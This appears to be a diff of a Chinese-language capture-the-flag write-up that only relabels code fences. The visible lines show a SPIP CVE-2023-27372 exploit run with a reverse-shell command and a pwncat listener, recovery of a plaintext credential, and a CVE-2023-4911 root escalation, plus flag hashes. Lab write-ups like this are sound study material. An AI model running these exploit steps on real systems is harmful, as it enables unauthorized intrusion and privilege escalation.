@@ -52,7 +52,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 执行目录探测
 
-```shell
+```bash
 [20:42:03] 200 -    7KB - /CHANGELOG.md
 [20:42:04] 200 -   34KB - /LICENSE
 [20:42:04] 200 -  842B  - /README.md
@@ -89,13 +89,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 尝试进行利用
 
-```shell
+```bash
 (env) ┌─[randark@parrot]─[~/exps]
 └──╼ $python3 CVE-2023-27372.py -u http://192.168.56.120/ -v -c "bash  reverse.sh"
 [+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
 ```
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
 [21:35:48] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
@@ -124,7 +124,7 @@ drwxr-xr-x 3 www-data www-data 4096 Oct  3 15:36 /var/www/html/vendor/algo26-mat
 
 检测到存在 mysql 数据库，并且检测到历史操作记录
 
-```shell title="/var/www/.bash_history"
+```bash title="/var/www/.bash_history"
 whoami
 exit
 exit
@@ -220,7 +220,7 @@ angela:4ng3l4
 
 成功登录 Angela 的账户
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs angela@192.168.56.120
 [21:59:30] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
@@ -233,7 +233,7 @@ angela
 
 ## user pwned
 
-```shell
+```bash
 (remote) angela@pipy:/home/angela$ cat user.txt
 dab37650d43787424362d5805140538d
 ```
@@ -262,7 +262,7 @@ dab37650d43787424362d5805140538d
 
 尝试利用
 
-```shell
+```bash
 (remote) angela@pipy:/home/angela/CVE-2023-4911$ ls -lh
 total 16K
 -rw-r--r-- 1 angela angela 3.8K Feb  1 14:23 exp.c
@@ -294,7 +294,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 # cat root.txt
 ab55ed08716cd894e8097a87dafed016
 ```
